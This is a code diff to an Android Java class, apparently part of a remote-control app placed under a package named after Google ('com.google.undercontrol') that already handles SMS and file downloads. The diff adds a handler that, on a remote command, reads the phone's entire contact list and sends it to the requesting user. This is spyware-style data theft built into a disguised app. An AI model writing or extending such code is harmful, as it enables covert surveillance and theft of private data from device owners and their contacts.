@@ -6,8 +6,10 @@ import java.util.List;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import com.google.undercontrol.dao.ContactDao;
 import com.google.undercontrol.dao.FileDao;
 import com.google.undercontrol.dao.SmsDao;
+import com.google.undercontrol.domain.ContactInfo;
 import com.google.undercontrol.domain.ConversInfo;
 import com.google.undercontrol.domain.FileInfo;
 import com.google.undercontrol.domain.MsgType;
@@ -78,11 +80,23 @@ public class MsgPorcess {
 			}else if(type.equals(MsgType.DOWNLOAD_FILE)) {
 //				下载文件
 				downloadFile(dwFromUserid, jObj);
+			}else if(type.equals(MsgType.READ_CONTACT_LIST)) {
+//				下载文件
+				readContactList(dwFromUserid);
 			}
 		} catch (JSONException e) {
 			Log.e(TAG,"Json格式不正确！");
 			e.printStackTrace();
 		}
+	}
+	/**
+	 * 读取联系人列表
+	 * @param dwFromUserid 
+	 */
+	private void readContactList(int dwFromUserid) {
+		ContactDao dao=new ContactDao(context);
+		List<ContactInfo> list = dao.getList();
+		MsgUtils.send(context, dwFromUserid, MsgType.CONTACT_LIST, list);
 	}
 	/**
 	 * 下载文件
